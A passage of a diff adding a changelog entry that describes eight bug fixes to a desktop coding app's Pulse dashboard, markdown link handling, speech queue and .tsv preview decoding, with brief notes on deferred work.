+  restoring the duplicated detail line each fail it with a real assertion error.
+
+## Pulse dashboard + markdown link fixes (2026-09-29)
+
+Review of the Pulse dashboard batch surfaced eight defects, all fixed with
+regression tests (several mutation-verified).
+
+- **A Pulse card jump landed on the wrong view.** `exitPulse` restored
+  `previousViewRef`, the view the user was in *before* the dashboard — so a card
+  click from Files/Git/Settings opened the chat tab in the target project but
+  left the user on the other view, then persisted that foreign view against the
+  target project. `exitPulse` now lands on the chat surface and arms
+  `pendingJumpViewRef`, which the project-switch restore effect honours (keyed by
+  the target path, so a same-project jump's leftover arm cannot dictate a later
+  switch). `previousViewRef` is now used only by the Cmd+J toggle, which is the
+  intent it was written for.
+- **`session_rekeyed` never reached the Pulse dashboard.** The handler in
+  `routeBusEnvelope` returns before the generic session-scoped path where
+  `pulseEventSink` lives, so `applyPulseRow`'s rekey branch was unreachable: the
+  card kept the dead old id after `/reset-id` and the next click opened a session
+  that no longer existed. The branch now forwards explicitly.
+- **A relative link in assistant text navigated the app away.** Gating
+  `preventDefault` on `isHTTPURL` let `[foo.go](internal/x/foo.go)` through; in
+  the desktop webview that resolves against ocode's own origin, so the SPA
+  fallback replaced the app. `MarkdownLink` now stops every href except an
+  in-page `#hash` or an OS hand-off scheme (`mailto:`/`tel:`/`sms:`). Note the
+  visible consequence: a relative link is now a silent no-op rather than opening
+  the file. That is the safe default (a chat bubble must never navigate the
+  shell) but it is not a finished answer — see TODO.md.
+- **Remote sessions drove a ~3 req/s `GET /api/pulse` storm.** The event bus
+  fans every host's frames into one sink, but `/api/pulse` is local-only by
+  design (`PulseRow` has no `host`). A remote turn's frames looked permanently
+  "unknown", re-arming the 300ms debounce for the whole turn. Envelopes are now
+  stamped with their originating host and the unknown-session refetch is withheld
+  for non-local hosts. No row is lost by this: remote sessions were never in the
+  list to begin with, so nothing became less visible — it just stopped polling
+  for something the response could not contain.
+- **`setScope` dropped a rapid toggle back.** The no-op guard compared against
+  the last *applied* scope, which only advances when a response lands, so
+  live→all→live in one tick lost the second click. It now compares against the
+  last *requested* scope.
+- **`usePulseTail` duplicated and reordered a card's tail.** The live `text`
+  subscription is installed before the seed resolves, so chunks arriving in that
+  window were appended first and the seed's `live_frames` after them. Live
+  chunks are now held and replayed seed-then-live.
+- **Hovering an idle Pulse card could strand a stale open tab.** The card's
+  speculative transcript read recorded a fresh revision baseline over an open
+  tab still showing older content, so the cross-process revalidation poll saw
+  "no change" and never repaired it. That read now opts out of the baseline.
+- **Stop during a speech summary stalled the next Speak for up to ~60s.** The
+  queue worker awaited the summary request with no abort signal, so it stayed
+  parked on an item the user had abandoned and anything enqueued waited behind
+  it. The request is now aborted by `haltCurrent`.
+
+- **A `.tsv` opened from disk was mojibaked.** `previewKind` routes `.csv` and
+  `.tsv` to the Excel viewer, but only `.csv` was decoded as UTF-8 before being
+  handed to SheetJS; a `.tsv` took the raw-bytes branch, which reads bytes as
+  latin-1, so "café" rendered as "cafÃ©" and CJK/emoji were mangled the same way.
+  The columns were correct throughout — SheetJS sniffs the tab delimiter on
+  either path — which is why this was easy to miss. The extension set now lives
+  in one exported `isDelimitedTextPath` in `previewKind.ts`, so the routing
+  decision and the decode decision cannot drift apart.
+
+Deferred (see TODO.md): an App-level test for the jump's ref lifecycle, the
+stale idle-card "Xm ago" label, and the now-fixed `.tsv` preview decode.
+
 ## 2026-09-29 - A long Speak summary now opens with a one-line recap
 
 Asking for a summary of a long reply gave two-to-five detail sentences with no
